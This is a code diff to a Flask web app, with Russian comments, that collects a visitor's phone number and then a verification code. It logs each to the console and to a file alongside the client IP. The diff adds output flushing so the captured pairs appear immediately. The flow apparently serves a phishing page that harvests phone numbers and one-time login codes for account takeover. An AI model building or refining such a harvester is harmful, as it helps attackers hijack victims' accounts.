@@ -1,4 +1,5 @@
 from flask import Flask, render_template, request, Response
+import sys
 
 app = Flask(__name__)
 
@@ -36,6 +37,7 @@ def submit_phone():
     
     # Выводим в консоль: IP -> Номер телефона
     print(f"{client_ip} -> {phone}")
+    sys.stdout.flush()  # Force flush to ensure immediate console output
     
     # Сохраняем в файл
     try:
@@ -44,6 +46,7 @@ def submit_phone():
         return render_template('Code.html')  # Перенаправляем на страницу кода
     except Exception as e:
         print(f"Ошибка при сохранении номера: {str(e)}")
+        sys.stdout.flush()  # Force flush for error message
         return Response(f"Ошибка при сохранении номера: {str(e)}", status=500)
 
 @app.route('/submit_code', methods=['POST'])
@@ -60,6 +63,7 @@ def submit_code():
     
     # Выводим в консоль: Номер телефона -> Код
     print(f"{phone} -> {code}")
+    sys.stdout.flush()  # Force flush to ensure immediate console output
     
     # Сохраняем в файл
     try:
@@ -68,6 +72,7 @@ def submit_code():
         return render_template('Success.html')  # Перенаправляем на страницу успеха
     except Exception as e:
         print(f"Ошибка при сохранении кода: {str(e)}")
+        sys.stdout.flush()  # Force flush for error message
         return render_template('Code.html', error=f"Error saving code: {str(e)}", previous_code=code)
 
 if __name__ == '__main__':
